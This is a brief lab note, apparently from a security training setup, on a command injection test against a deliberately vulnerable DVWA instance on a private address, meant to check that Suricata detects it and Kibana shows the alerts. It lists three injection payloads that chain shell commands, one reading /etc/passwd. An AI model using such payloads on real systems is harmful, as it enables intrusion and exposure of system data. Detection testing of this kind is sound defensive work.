\# Command Injection Attack



Target:

http://192.168.56.107/DVWA/vulnerabilities/exec/



Payloads Used:

\- 127.0.0.1; ls

\- 127.0.0.1 \&\& whoami

\- 127.0.0.1; cat /etc/passwd



Expected Outcome:

\- OS commands executed on target

\- Suricata detects malicious HTTP payload

\- Alerts visualized in Kibana



